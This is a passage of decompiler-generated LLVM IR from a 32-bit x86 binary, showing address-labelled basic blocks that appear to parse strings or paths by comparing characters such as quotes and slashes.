  br label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_804994e, %dec_label_pc_8049982
  %v1_8049ef8 = phi i32 [ %v1_804997c, %dec_label_pc_804994e ], [ %v1_80499c0, %dec_label_pc_8049982 ]
  %v1_80499c3 = add i32 %v1_8049ef8, 20900
  %v2_80499c3 = inttoptr i32 %v1_80499c3 to i32*
  %v3_80499c3 = load i32, i32* %v2_80499c3, align 4
  store i32 %v3_80499c3, i32* %eax.global-to-local, align 4
  %v0_80499ca = load i32, i32* @esi, align 4
  %v2_80499ca = add i32 %v0_80499ca, %v3_80499c3
  %v3_80499ca = inttoptr i32 %v2_80499ca to i8*
  %v4_80499ca = load i8, i8* %v3_80499ca, align 1
  %v13_80499ca = icmp eq i8 %v4_80499ca, 34
  store i1 %v13_80499ca, i1* %zf.global-to-local, align 1
  br i1 %v13_80499ca, label %dec_label_pc_8049ef5, label %dec_label_pc_80499d4

dec_label_pc_80499d4:                             ; preds = %dec_label_pc_8049ef5, %dec_label_pc_80499c3, %dec_label_pc_8049f19
  %v1_80499d4 = phi i32 [ %v1_8049f0b, %dec_label_pc_8049ef5 ], [ %v1_8049ef8, %dec_label_pc_80499c3 ], [ %v1_80499d4.pre, %dec_label_pc_8049f19 ]
  %v0_80499d4 = phi i32 [ %v2_8049f06, %dec_label_pc_8049ef5 ], [ %v3_80499c3, %dec_label_pc_80499c3 ], [ %v0_80499d4.pre, %dec_label_pc_8049f19 ]
  %v2_80499d4 = add i32 %v1_80499d4, -4
  %v3_80499d4 = inttoptr i32 %v2_80499d4 to i32*
  store i32 %v0_80499d4, i32* %v3_80499d4, align 4
  %v0_80499d5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499d5 = add i32 %v1_80499d4, -8
  %v3_80499d5 = inttoptr i32 %v2_80499d5 to i32*
  store i32 %v0_80499d5, i32* %v3_80499d5, align 4
  %v1_80499d6 = add i32 %v1_80499d4, -12
  %v2_80499d6 = inttoptr i32 %v1_80499d6 to i32*
  store i32 10, i32* %v2_80499d6, align 4
  %v0_80499d8 = load i32, i32* @esi, align 4
  %v2_80499d8 = add i32 %v1_80499d4, -16
  %v3_80499d8 = inttoptr i32 %v2_80499d8 to i32*
  store i32 %v0_80499d8, i32* %v3_80499d8, align 4
  %v3_80499d9 = call i32 @function_80526e0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  %v0_80499de = load i32, i32* @esp, align 4
  %v1_80499de = add i32 %v0_80499de, 16
  store i32 %v3_80499d9, i32* %edx.global-to-local, align 4
  %v1_80499e3 = add i32 %v3_80499d9, -1
  store i32 %v1_80499e3, i32* %eax.global-to-local, align 4
  %v9_80499e6 = icmp eq i32 %v3_80499d9, 9
  store i1 %v9_80499e6, i1* %zf.global-to-local, align 1
  %v6_80499e9 = icmp ugt i32 %v1_80499e3, 8
  br i1 %v6_80499e9, label %dec_label_pc_8049a11, label %dec_label_pc_80499eb

dec_label_pc_80499eb:                             ; preds = %dec_label_pc_80499d4
  %v1_80499eb = add i32 %v0_80499de, 132
  %v2_80499eb = inttoptr i32 %v1_80499eb to i32*
  %v3_80499eb = load i32, i32* %v2_80499eb, align 4
  %v2_80499ef = add i32 %v3_80499eb, %v3_80499d9
  store i32 %v2_80499ef, i32* @ebx, align 4
  %v9_8049a00186 = icmp eq i32 %v1_80499de, 12
  store i1 %v9_8049a00186, i1* %zf.global-to-local, align 1
  %v2_8049a03188 = inttoptr i32 %v0_80499de to i32*
  store i32 0, i32* %v2_8049a03188, align 4
  %v2_8049a05189 = call i32 @function_8052e42(i32* %v1_80484ea)
  store i32 %v2_8049a05189, i32* %eax.global-to-local, align 4
  %v0_8049a0a190 = load i32, i32* @esp, align 4
  %v1_8049a0a191 = add i32 %v0_8049a0a190, 16
  %v1_8049a0d192 = load i32, i32* @ebx, align 4
  %v7_8049a0d193 = icmp ult i32 %v2_8049a05189, %v1_8049a0d192
  %v12_8049a0d194 = icmp eq i32 %v2_8049a05189, %v1_8049a0d192
  store i1 %v12_8049a0d194, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d193, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_80499f3:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3
  %v0_8049a0a195 = phi i32 [ %v0_8049a0a, %dec_label_pc_80499f3 ], [ %v0_8049a0a190, %dec_label_pc_80499eb ]
  %v9_80499f3 = icmp eq i32 %v0_8049a0a195, -4
  store i1 %v9_80499f3, i1* %zf.global-to-local, align 1
  %v2_80499f6 = inttoptr i32 %v0_8049a0a195 to i32*
  store i32 1, i32* %v2_80499f6, align 4
  %v1_80499f8 = call i32 @function_8054730(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80499f8, i32* %eax.global-to-local, align 4
  %v0_80499fd = load i32, i32* @esp, align 4
  %v9_8049a00 = icmp eq i32 %v0_80499fd, -4
  store i1 %v9_8049a00, i1* %zf.global-to-local, align 1
  %v2_8049a03 = inttoptr i32 %v0_80499fd to i32*
  store i32 0, i32* %v2_8049a03, align 4
  %v2_8049a05 = call i32 @function_8052e42(i32* %v1_80484ea)
  store i32 %v2_8049a05, i32* %eax.global-to-local, align 4
  %v0_8049a0a = load i32, i32* @esp, align 4
  %v1_8049a0a = add i32 %v0_8049a0a, 16
  %v1_8049a0d = load i32, i32* @ebx, align 4
  %v7_8049a0d = icmp ult i32 %v2_8049a05, %v1_8049a0d
  %v12_8049a0d = icmp eq i32 %v2_8049a05, %v1_8049a0d
  store i1 %v12_8049a0d, i1* %zf.global-to-local, align 1
  br i1 %v7_8049a0d, label %dec_label_pc_80499f3, label %dec_label_pc_8049a11

dec_label_pc_8049a11:                             ; preds = %dec_label_pc_80499eb, %dec_label_pc_80499f3, %dec_label_pc_80499d4
  %v0_8049a1a = phi i32 [ %v1_80499de, %dec_label_pc_80499d4 ], [ %v1_8049a0a191, %dec_label_pc_80499eb ], [ %v1_8049a0a, %dec_label_pc_80499f3 ]
  %v1_8049a11 = add i32 %v0_8049a1a, 20900
  %v2_8049a11 = inttoptr i32 %v1_8049a11 to i32*
  %v3_8049a11 = load i32, i32* %v2_8049a11, align 4
  store i32 %v3_8049a11, i32* %eax.global-to-local, align 4
  %v0_8049a18 = load i32, i32* @esi, align 4
  %v2_8049a1d = add i32 %v0_8049a18, %v3_8049a11
  %v12_8049a1d = icmp eq i32 %v2_8049a1d, 0
  store i1 %v12_8049a1d, i1* %zf.global-to-local, align 1
  store i32 %v2_8049a1d, i32* @ebx, align 4
  %v2_8049a1f = add i32 %v0_8049a1a, -16
  %v3_8049a1f = inttoptr i32 %v2_8049a1f to i32*
  store i32 %v2_8049a1d, i32* %v3_8049a1f, align 4
  %v2_8049a20 = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049a20, i32* %eax.global-to-local, align 4
  %v0_8049a25 = load i32, i32* @esp, align 4
  %v9_8049a25 = icmp eq i32 %v0_8049a25, -12
  store i1 %v9_8049a25, i1* %zf.global-to-local, align 1
  %v1_8049a28 = add i32 %v0_8049a25, 8
  %v2_8049a28 = inttoptr i32 %v1_8049a28 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554ab.15 to i32), i32* %v2_8049a28, align 4
  %v2_8049a2d = add i32 %v0_8049a25, 4
  %v3_8049a2d = inttoptr i32 %v2_8049a2d to i32*
  store i32 %v2_8049a20, i32* %v3_8049a2d, align 4
  %v0_8049a2e = load i32, i32* @ebx, align 4
  %v3_8049a2e = inttoptr i32 %v0_8049a25 to i32*
  store i32 %v0_8049a2e, i32* %v3_8049a2e, align 4
  %v4_8049a2f = call i32 @function_80528d0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049a2f, i32* %eax.global-to-local, align 4
  %v0_8049a34 = load i32, i32* @esp, align 4
  %v1_8049a34 = add i32 %v0_8049a34, 16
  %v9_8049a37 = icmp eq i32 %v4_8049a2f, 4
  store i1 %v9_8049a37, i1* %zf.global-to-local, align 1
  br i1 %v9_8049a37, label %dec_label_pc_8049e6a, label %dec_label_pc_8049a40

dec_label_pc_8049a40:                             ; preds = %dec_label_pc_8049a11
  %v0_8049a40 = load i32, i32* @ebx, align 4
  %v1_8049a40 = inttoptr i32 %v0_8049a40 to i8*
  %v2_8049a40 = load i8, i8* %v1_8049a40, align 1
  %v11_8049a40 = icmp eq i8 %v2_8049a40, 47
  store i1 %v11_8049a40, i1* %zf.global-to-local, align 1
  br i1 %v11_8049a40, label %dec_label_pc_8049d1e, label %dec_label_pc_8049a49

dec_label_pc_8049a49:                             ; preds = %dec_label_pc_8049d41, %dec_label_pc_8049d1e, %dec_label_pc_8049a40, %dec_label_pc_8049d76
  %v0_8049a49 = phi i32 [ %v1_8049d6b, %dec_label_pc_8049d41 ], [ %v1_8049d33, %dec_label_pc_8049d1e ], [ %v1_8049a34, %dec_label_pc_8049a40 ], [ %v1_8049d8b, %dec_label_pc_8049d76 ]
  %v1_8049a49 = add i32 %v0_8049a49, 76
  %v2_8049a49 = inttoptr i32 %v1_8049a49 to i32*
  %v3_8049a49 = load i32, i32* %v2_8049a49, align 4
  store i32 %v3_8049a49, i32* %edx.global-to-local, align 4
  %v1_8049a4d = add i32 %v3_8049a49, 1431
  %v2_8049a4d = inttoptr i32 %v1_8049a4d to i32*
  store i32 5522759, i32* %v2_8049a4d, align 4
  %v0_8049a57 = load i32, i32* @esp, align 4
  %v1_8049a57 = add i32 %v0_8049a57, 92
  %v2_8049a57 = inttoptr i32 %v1_8049a57 to i32*
  %v3_8049a57 = load i32, i32* %v2_8049a57, align 4
  store i32 %v3_8049a57, i32* %ecx.global-to-local, align 4
  %v1_8049a5b = add i32 %v3_8049a57, -1448
  %v2_8049a5b = inttoptr i32 %v1_8049a5b to i8*
  store i8 10, i8* %v2_8049a5b, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049124
  %v1_8049a67 = add i32 %v0_8049145, 108
  %v2_8049a67 = inttoptr i32 %v1_8049a67 to i32*
  %v3_8049a67 = load i32, i32* %v2_8049a67, align 4
  store i32 %v3_8049a67, i32* %eax.global-to-local, align 4
  %v1_8049a6b = add i32 %v3_8049a67, 12
  %v2_8049a6b = inttoptr i32 %v1_8049a6b to i32*
  store i32 0, i32* %v2_8049a6b, align 4
  br label %dec_label_pc_80491db

dec_label_pc_8049a77:                             ; preds = %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge, %dec_label_pc_804987f, %dec_label_pc_8049854
  %v0_8049a77 = phi i32 [ %v0_8049a77.pre, %dec_label_pc_8049928.dec_label_pc_8049a77_crit_edge ], [ %v1_80498d4, %dec_label_pc_804987f ], [ %v1_8049875, %dec_label_pc_8049854 ]
  %v1_8049a77 = add i32 %v0_8049a77, -4
  %v2_8049a77 = inttoptr i32 %v1_8049a77 to i32*
  store i32 4, i32* %v2_8049a77, align 4
  %v1_8049a79 = add i32 %v0_8049a77, -8
  %v2_8049a79 = inttoptr i32 %v1_8049a79 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80554a4.13 to i32), i32* %v2_8049a79, align 4
  %v1_8049a7e = add i32 %v0_8049a77, 104
  %v2_8049a7e = inttoptr i32 %v1_8049a7e to i32*
  %v3_8049a7e = load i32, i32* %v2_8049a7e, align 4
  store i32 %v3_8049a7e, i32* %ecx.global-to-local, align 4
  %v2_8049a82 = add i32 %v0_8049a77, -12
  %v3_8049a82 = inttoptr i32 %v2_8049a82 to i32*
  store i32 %v3_8049a7e, i32* %v3_8049a82, align 4
  %v1_8049a83 = add i32 %v0_8049a77, 131
  store i32 %v1_8049a83, i32* %eax.global-to-local, align 4
  %v2_8049a8a = add i32 %v0_8049a77, -16
  %v3_8049a8a = inttoptr i32 %v2_8049a8a to i32*
  store i32 %v1_8049a83, i32* %v3_8049a8a, align 4
  %v0_8049a8b = call i32 @function_8052690()
  store i32 %v0_8049a8b, i32* %eax.global-to-local, align 4
  %v0_8049a90 = load i32, i32* @esp, align 4
  %v1_8049a90 = add i32 %v0_8049a90, 92
  %v2_8049a90 = inttoptr i32 %v1_8049a90 to i32*
  %v3_8049a90 = load i32, i32* %v2_8049a90, align 4
  store i32 %v0_8049a8b, i32* @esi, align 4
  %v1_8049a96 = add i32 %v3_8049a90, 1431
  %v9_8049a96 = icmp eq i32 %v1_8049a96, 0
  store i1 %v9_8049a96, i1* %zf.global-to-local, align 1
  store i32 %v1_8049a96, i32* @ebx, align 4
  %v1_8049a9c = inttoptr i32 %v0_8049a90 to i32*
  %v2_8049a9c = load i32, i32* %v1_8049a9c, align 4
  store i32 %v2_8049a9c, i32* %eax.global-to-local, align 4
  %v3_8049a9c = add i32 %v0_8049a90, 4
  %v1_8049a9d = inttoptr i32 %v3_8049a9c to i32*
  %v2_8049a9d = load i32, i32* %v1_8049a9d, align 4
  store i32 %v2_8049a9d, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80554b5.18 to i32), i32* %v1_8049a9d, align 4
  %v0_8049aa3 = load i32, i32* @ebx, align 4
  store i32 %v0_8049aa3, i32* %v1_8049a9c, align 4
  %v0_8049aa4 = call i32 @function_8052950()
  store i32 %v0_8049aa4, i32* %eax.global-to-local, align 4
  %v0_8049aa9 = load i32, i32* @esp, align 4
  %v3_8049aac = trunc i32 %v0_8049aa4 to i8
  %v4_8049aac = icmp eq i8 %v3_8049aac, 0
  store i1 %v4_8049aac, i1* %zf.global-to-local, align 1
  br i1 %v4_8049aac, label %dec_label_pc_8049c4e, label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049a77
  %v0_8049ab4.in = phi i32 [ %v0_8049c5b, %dec_label_pc_8049c4e ], [ %v0_8049aa9, %dec_label_pc_8049a77 ]
  %v1_8049ab4 = add i32 %v0_8049ab4.in, 108
  %v2_8049ab4 = inttoptr i32 %v1_8049ab4 to i32*
  %v3_8049ab4 = load i32, i32* %v2_8049ab4, align 4
  store i32 %v3_8049ab4, i32* %edx.global-to-local, align 4
  %v1_8049ab8 = add i32 %v3_8049ab4, -1448
  %v2_8049ab8 = inttoptr i32 %v1_8049ab8 to i8*
  store i8 7, i8* %v2_8049ab8, align 1
  br label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049c66, %dec_label_pc_8049ab4
  %v0_8049abf = load i32, i32* @esp, align 4
  %v1_8049abf = add i32 %v0_8049abf, -4
  %v2_8049abf = inttoptr i32 %v1_8049abf to i32*
  store i32 16384, i32* %v2_8049abf, align 4
  %v0_8049ac4 = load i32, i32* @esi, align 4
  %v2_8049ac4 = add i32 %v0_8049abf, -8
  %v3_8049ac4 = inttoptr i32 %v2_8049ac4 to i32*
  store i32 %v0_8049ac4, i32* %v3_8049ac4, align 4
  %v1_8049ac5 = add i32 %v0_8049abf, 131
  store i32 %v1_8049ac5, i32* %eax.global-to-local, align 4
  %v2_8049acc = add i32 %v0_8049abf, -12
  %v3_8049acc = inttoptr i32 %v2_8049acc to i32*
  store i32 %v1_8049ac5, i32* %v3_8049acc, align 4
  %v1_8049acd = add i32 %v0_8049abf, 92
  %v2_8049acd = inttoptr i32 %v1_8049acd to i32*
  %v3_8049acd = load i32, i32* %v2_8049acd, align 4
  store i32 %v3_8049acd, i32* %edx.global-to-local, align 4
  %v1_8049ad1 = add i32 %v3_8049acd, -1452
  %v2_8049ad1 = inttoptr i32 %v1_8049ad1 to i32*
  %v3_8049ad1 = load i32, i32* %v2_8049ad1, align 4
  store i32 %v3_8049ad1, i32* %eax.global-to-local, align 4
  %v2_8049ad7 = add i32 %v0_8049abf, -16
  %v3_8049ad7 = inttoptr i32 %v2_8049ad7 to i32*
  store i32 %v3_8049ad1, i32* %v3_8049ad7, align 4
  %v0_8049ad8 = call i32 @function_805324e()
  store i32 %v0_8049ad8, i32* %eax.global-to-local, align 4
  %v0_8049add = load i32, i32* @esp, align 4
  %v6_8049add = icmp eq i32 %v0_8049add, -16
  store i1 %v6_8049add, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049ae5:                             ; preds = %dec_label_pc_8048ebe
  %v3_8049ae5 = load i32, i32* %v2_8049ae5, align 4
  %v4_8049ae5 = add i32 %v3_8049ae5, -10239
  %v9_8049ae5 = sub i32 10238, %v3_8049ae5
  %v10_8049ae5 = and i32 %v9_8049ae5, %v3_8049ae5
  %v11_8049ae5 = icmp slt i32 %v10_8049ae5, 0
  %v12_8049ae5 = icmp eq i32 %v4_8049ae5, 0
  store i1 %v12_8049ae5, i1* %zf.global-to-local, align 1
  %v13_8049ae5 = icmp slt i32 %v4_8049ae5, 0
  %v3_8049aed = icmp ne i1 %v13_8049ae5, %v11_8049ae5
  %v4_8049aed = or i1 %v12_8049ae5, %v3_8049aed
  br i1 %v4_8049aed, label %dec_label_pc_8048d91, label %dec_label_pc_8048ee1

dec_label_pc_8049af8:                             ; preds = %dec_label_pc_8049577
  %v0_8049af8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049af8 = add i32 %v0_8049af8, -1448
  %v2_8049af8 = inttoptr i32 %v1_8049af8 to i8*
  store i8 1, i8* %v2_8049af8, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_8049b04:                             ; preds = %dec_label_pc_80497ba
  %v0_8049b04 = load i32, i32* @ebx, align 4
  %v1_8049b04 = inttoptr i32 %v0_8049b04 to i32*
  store i32 104, i32* %v1_8049b04, align 4
  %v0_80497f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80497f9

dec_label_pc_8049b0f:                             ; preds = %dec_label_pc_8049518
  %v0_8049b0f = load i32, i32* @edi, align 4
  %v1_8049b0f = inttoptr i32 %v0_8049b0f to i32*
  %v2_8049b0f = load i32, i32* %v1_8049b0f, align 4
  %v11_8049b0f = icmp eq i32 %v2_8049b0f, 11
  store i1 %v11_8049b0f, i1* %zf.global-to-local, align 1
  %v1_8049b12 = icmp eq i1 %v11_8049b0f, false
  br i1 %v1_8049b12, label %dec_label_pc_8048e4a, label %dec_label_pc_8048d91

dec_label_pc_8049b1d:                             ; preds = %dec_label_pc_8049468
  %v1_8049b1d = add i32 %v0_804948a, 20916
  %v2_8049b1d = inttoptr i32 %v1_8049b1d to i32*
  store i32 7, i32* %v2_8049b1d, align 4
  %v0_8049b28 = load i32, i32* @esi, align 4
  %v1_8049b28 = add i32 %v0_8049b28, 4
  %v2_8049b28 = inttoptr i32 %v1_8049b28 to i8*
  %v3_8049b28 = load i8, i8* %v2_8049b28, align 1
  %v12_8049b28 = icmp eq i8 %v3_8049b28, 115
  store i1 %v12_8049b28, i1* %zf.global-to-local, align 1
  br i1 %v12_8049b28, label %dec_label_pc_8049d93, label %dec_label_pc_8049b32

dec_label_pc_8049b32:                             ; preds = %dec_label_pc_8049b1d, %dec_label_pc_8049d93
  %v0_8049b32 = load i32, i32* @esp, align 4
  %v1_8049b32 = add i32 %v0_8049b32, 20900
  %v2_8049b32 = inttoptr i32 %v1_8049b32 to i32*
  %v3_8049b32 = load i32, i32* %v2_8049b32, align 4
  store i32 %v3_8049b32, i32* %eax.global-to-local, align 4
  %v0_8049b39 = load i32, i32* @edx, align 4
  %v2_8049b39 = add i32 %v0_8049b32, -4
  %v3_8049b39 = inttoptr i32 %v2_8049b39 to i32*
  store i32 %v0_8049b39, i32* %v3_8049b39, align 4
  %v0_8049b3a = load i32, i32* @ebx, align 4
  %v1_8049b3a = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b3a = sub i32 %v0_8049b3a, %v1_8049b3a
  %v12_8049b3a = icmp eq i32 %v2_8049b3a, 0
  store i1 %v12_8049b3a, i1* %zf.global-to-local, align 1
  store i32 %v2_8049b3a, i32* @ebx, align 4
  %v0_8049b3c = load i32, i32* @esi, align 4
  %v2_8049b3c = add i32 %v0_8049b3c, %v1_8049b3a
  store i32 %v2_8049b3c, i32* %eax.global-to-local, align 4
  %v2_8049b3f = add i32 %v0_8049b32, -8
  %v3_8049b3f = inttoptr i32 %v2_8049b3f to i32*
  store i32 %v2_8049b3a, i32* %v3_8049b3f, align 4
  %v0_8049b40 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049b40 = add i32 %v0_8049b32, -12
  %v3_8049b40 = inttoptr i32 %v2_8049b40 to i32*
  store i32 %v0_8049b40, i32* %v3_8049b40, align 4
  %v0_8049b41 = load i32, i32* @esi, align 4
  %v2_8049b41 = add i32 %v0_8049b32, -16
  %v3_8049b41 = inttoptr i32 %v2_8049b41 to i32*
  store i32 %v0_8049b41, i32* %v3_8049b41, align 4
  %v4_8049b42 = call i32 @function_80530e3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049b42, i32* %eax.global-to-local, align 4
  %v0_8049b47 = load i32, i32* @esp, align 4
  %v1_8049b47 = add i32 %v0_8049b47, 20916
  %v2_8049b47 = inttoptr i32 %v1_8049b47 to i32*
  store i32 0, i32* %v2_8049b47, align 4
  %v0_8049b52 = load i32, i32* @esi, align 4
  %v1_8049b52 = inttoptr i32 %v0_8049b52 to i8*
  %v2_8049b52 = load i8, i8* %v1_8049b52, align 1
  %v3_8049b52 = zext i8 %v2_8049b52 to i32
  %v5_8049b52 = and i32 %v4_8049b42, -256
  %v6_8049b52 = or i32 %v3_8049b52, %v5_8049b52
  store i32 %v6_8049b52, i32* %eax.global-to-local, align 4
  %v0_8049b54 = load i32, i32* @esp, align 4
  %v4_8049b57 = icmp eq i8 %v2_8049b52, 0
  store i1 %v4_8049b57, i1* %zf.global-to-local, align 1
  br i1 %v4_8049b57, label %dec_label_pc_8049b86, label %dec_label_pc_8049b5b

dec_label_pc_8049b5b:                             ; preds = %dec_label_pc_8049b32
  store i32 %v0_8049b52, i32* %ecx.global-to-local, align 4
  %v10_8049b5d = icmp eq i8 %v2_8049b52, 47
  store i1 %v10_8049b5d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b5d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b65

dec_label_pc_8049b65:                             ; preds = %dec_label_pc_8049b5b
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_8049b76172 = add i32 %v0_8049b52, 1
  store i32 %v2_8049b76172, i32* %ecx.global-to-local, align 4
  %v2_8049b79173 = add i32 %v0_8049b54, 20916
  %v3_8049b79174 = inttoptr i32 %v2_8049b79173 to i32*
  store i32 1, i32* %v3_8049b79174, align 4
  %v0_8049b80175 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80176 = inttoptr i32 %v0_8049b80175 to i8*
  %v2_8049b80177 = load i8, i8* %v1_8049b80176, align 1
  %v3_8049b80178 = zext i8 %v2_8049b80177 to i32
  %v4_8049b80179 = load i32, i32* @edx, align 4
  %v5_8049b80180 = and i32 %v4_8049b80179, -256
  %v6_8049b80181 = or i32 %v5_8049b80180, %v3_8049b80178
  store i32 %v6_8049b80181, i32* %edx.global-to-local, align 4
  %v4_8049b82182 = icmp eq i8 %v2_8049b80177, 0
  store i1 %v4_8049b82182, i1* %zf.global-to-local, align 1
  %v1_8049b84183 = icmp eq i1 %v4_8049b82182, false
  br i1 %v1_8049b84183, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge
  %v2_8049b80185 = phi i8 [ %v2_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v2_8049b80177, %dec_label_pc_8049b65 ]
  %v0_8049b80184 = phi i32 [ %v0_8049b80, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge ], [ %v0_8049b80175, %dec_label_pc_8049b65 ]
  %v0_8049b6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049b6c = add i32 %v0_8049b6c, 1
  store i32 %v1_8049b6c, i32* %eax.global-to-local, align 4
  %v10_8049b6d = icmp eq i8 %v2_8049b80185, 47
  store i1 %v10_8049b6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8049b6d, label %dec_label_pc_8049c80, label %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge

dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge: ; preds = %dec_label_pc_8049b6c
  %v1_8049b76.pre = load i32, i32* @esi, align 4
  %v1_8049b79.pre = load i32, i32* @esp, align 4
  %v2_8049b76 = add i32 %v1_8049b6c, %v1_8049b76.pre
  store i32 %v2_8049b76, i32* %ecx.global-to-local, align 4
  %v2_8049b79 = add i32 %v1_8049b79.pre, 20900
  %v3_8049b79 = inttoptr i32 %v2_8049b79 to i32*
  store i32 %v1_8049b6c, i32* %v3_8049b79, align 4
  %v0_8049b80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049b80 = inttoptr i32 %v0_8049b80 to i8*
  %v2_8049b80 = load i8, i8* %v1_8049b80, align 1
  %v3_8049b80 = zext i8 %v2_8049b80 to i32
  %v4_8049b80 = load i32, i32* %edx.global-to-local, align 4
  %v5_8049b80 = and i32 %v4_8049b80, -256
  %v6_8049b80 = or i32 %v5_8049b80, %v3_8049b80
  store i32 %v6_8049b80, i32* %edx.global-to-local, align 4
  %v4_8049b82 = icmp eq i8 %v2_8049b80, 0
  store i1 %v4_8049b82, i1* %zf.global-to-local, align 1
  %v1_8049b84 = icmp eq i1 %v4_8049b82, false
  br i1 %v1_8049b84, label %dec_label_pc_8049b6c, label %dec_label_pc_8049b86

dec_label_pc_8049b86:                             ; preds = %dec_label_pc_8049b65, %dec_label_pc_8049b6c.dec_label_pc_8049b76_crit_edge, %dec_label_pc_8049b32, %dec_label_pc_8049c80
  %v0_8049b86 = load i32, i32* @esp, align 4
  %v9_8049b86 = icmp eq i32 %v0_8049b86, 12
  store i1 %v9_8049b86, i1* %zf.global-to-local, align 1
  %v0_8049b89 = load i32, i32* @esi, align 4
  %v2_8049b89 = add i32 %v0_8049b86, -16
  %v3_8049b89 = inttoptr i32 %v2_8049b89 to i32*
  store i32 %v0_8049b89, i32* %v3_8049b89, align 4
  %v2_8049b8a = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049b8a, i32* %eax.global-to-local, align 4
  %v0_8049b8f = load i32, i32* @esp, align 4
  %v1_8049b8f = add i32 %v0_8049b8f, 16
  %v1_8049b92 = icmp eq i32 %v2_8049b8a, 0
  store i1 %v1_8049b92, i1* %zf.global-to-local, align 1
  %tmp148 = icmp slt i32 %v2_8049b8a, 1
  br i1 %tmp148, label %dec_label_pc_8049bbc, label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049b86
  %v9_8049b96 = icmp eq i32 %v0_8049b8f, -4
  store i1 %v9_8049b96, i1* %zf.global-to-local, align 1
  %v0_8049b99 = load i32, i32* @esi, align 4
  %v3_8049b99 = inttoptr i32 %v0_8049b8f to i32*
  store i32 %v0_8049b99, i32* %v3_8049b99, align 4
  %v2_8049b9a = call i32 @function_80525e0(i8* %v1_8048752)
  store i32 %v2_8049b9a, i32* %eax.global-to-local, align 4
  %v0_8049b9f = load i32, i32* @esp, align 4
  %v1_8049b9f = add i32 %v0_8049b9f, 16
  %v1_8049ba2 = add i32 %v2_8049b9a, -127
  %v6_8049ba2 = sub i32 126, %v2_8049b9a
  %v7_8049ba2 = and i32 %v6_8049ba2, %v2_8049b9a
  %v8_8049ba2 = icmp slt i32 %v7_8049ba2, 0
  %v9_8049ba2 = icmp eq i32 %v1_8049ba2, 0
  store i1 %v9_8049ba2, i1* %zf.global-to-local, align 1
  %v10_8049ba2 = icmp slt i32 %v1_8049ba2, 0
  %v3_8049ba5 = icmp eq i1 %v10_8049ba2, %v8_8049ba2
  %v4_8049ba5 = icmp eq i1 %v9_8049ba2, false
  %v5_8049ba5 = and i1 %v4_8049ba5, %v3_8049ba5
  br i1 %v5_8049ba5, label %dec_label_pc_8049bbc, label %dec_label_pc_8049ba7

dec_label_pc_8049ba7:                             ; preds = %dec_label_pc_8049b96
  %v2_8049ba7 = add i32 %v0_8049b9f, 12
  %v3_8049ba7 = inttoptr i32 %v2_8049ba7 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba7, align 4
  %v2_8049ba8 = add i32 %v0_8049b9f, 8
  %v3_8049ba8 = inttoptr i32 %v2_8049ba8 to i32*
  store i32 %v2_8049b9a, i32* %v3_8049ba8, align 4
  %v0_8049ba9 = load i32, i32* @esi, align 4
  %v2_8049ba9 = add i32 %v0_8049b9f, 4
  %v3_8049ba9 = inttoptr i32 %v2_8049ba9 to i32*
  store i32 %v0_8049ba9, i32* %v3_8049ba9, align 4
  %v1_8049baa = add i32 %v0_8049b9f, 92
  %v2_8049baa = inttoptr i32 %v1_8049baa to i32*
  %v3_8049baa = load i32, i32* %v2_8049baa, align 4
  %v1_8049bae = add i32 %v3_8049baa, 789
  %v9_8049bae = icmp eq i32 %v1_8049bae, 0
  store i1 %v9_8049bae, i1* %zf.global-to-local, align 1
  store i32 %v1_8049bae, i32* %eax.global-to-local, align 4
  %v3_8049bb3 = inttoptr i32 %v0_8049b9f to i32*
  store i32 %v1_8049bae, i32* %v3_8049bb3, align 4
  %v3_8049bb4 = call i32 @function_8052600(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049bb4, i32* %eax.global-to-local, align 4
  %v0_8049bb9 = load i32, i32* @esp, align 4
  %v1_8049bb9 = add i32 %v0_8049bb9, 16
  %v6_8049bb9 = icmp eq i32 %v1_8049bb9, 0
  store i1 %v6_8049bb9, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049bbc

